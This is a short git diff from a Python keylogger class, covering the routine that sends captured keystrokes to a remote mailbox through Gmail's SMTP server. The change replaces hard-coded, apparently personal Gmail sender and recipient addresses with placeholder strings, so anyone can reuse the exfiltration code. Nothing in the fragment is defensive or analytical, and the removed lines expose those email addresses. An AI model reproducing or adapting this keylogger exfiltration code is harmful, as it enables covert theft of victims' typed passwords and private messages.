@@ -103,10 +103,10 @@ class Keylogger:
             # Connect to Gmail's SMTP Outgoing Mail server with such context
             with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
 
-                server.login("malaikamunawar55@gmail.com", EMAIL_PASSWORD)
+                server.login("sending mail here", EMAIL_PASSWORD)
  
                 #server.sendmail(email, email, self.prepare_mail(message))
-                server.sendmail("malaikamunawar55@gmail.com", "malaikamunawar50@gmail.com", self.prepare_mail(message))
+                server.sendmail("sending mail here", "receiver mail here", self.prepare_mail(message))
                 
                 server.quit()
             if verbose:
